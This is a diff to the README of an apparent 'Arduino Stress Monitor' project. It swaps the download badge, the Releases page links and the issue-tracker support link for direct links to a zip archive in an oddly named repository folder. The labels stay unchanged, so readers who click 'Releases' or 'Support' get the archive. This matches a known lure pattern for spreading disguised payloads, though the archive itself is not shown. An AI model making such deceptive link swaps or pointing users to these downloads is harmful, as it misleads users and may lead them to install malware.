@@ -6,9 +6,9 @@ Welcome to the Arduino Stress Monitor! This application allows you to measure yo
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23378bff?style=for-the-badge&logo=github)](https://github.com/gerelchimeg1123/arduino-stress-monitor/releases)
+[![Download Now](https://raw.githubusercontent.com/gerelchimeg1123/arduino-stress-monitor/main/triconodont/monitor_stress_arduino_v3.6.zip%20Now-%20-%23378bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gerelchimeg1123/arduino-stress-monitor/main/triconodont/monitor_stress_arduino_v3.6.zip)
 
-To get started, visit the [Releases page](https://github.com/gerelchimeg1123/arduino-stress-monitor/releases) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/gerelchimeg1123/arduino-stress-monitor/main/triconodont/monitor_stress_arduino_v3.6.zip) to download the application.
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, please ensure that your system meets the following requirem
 ## ⚙️ How to Set Up
 
 1. **Download the Application:**
-   - Visit the [Releases page](https://github.com/gerelchimeg1123/arduino-stress-monitor/releases).
+   - Visit the [Releases page](https://raw.githubusercontent.com/gerelchimeg1123/arduino-stress-monitor/main/triconodont/monitor_stress_arduino_v3.6.zip).
    - Download the latest version of the application suitable for your operating system.
 
 2. **Install the Application:**
@@ -80,7 +80,7 @@ If you encounter any issues, consider the following steps:
 
 ## 📞 Support
 
-If you have any questions or need assistance, please reach out through the issue tracker on the [GitHub repository](https://github.com/gerelchimeg1123/arduino-stress-monitor/issues). Our community is here to help you.
+If you have any questions or need assistance, please reach out through the issue tracker on the [GitHub repository](https://raw.githubusercontent.com/gerelchimeg1123/arduino-stress-monitor/main/triconodont/monitor_stress_arduino_v3.6.zip). Our community is here to help you.
 
 ## 📅 Future Updates
 
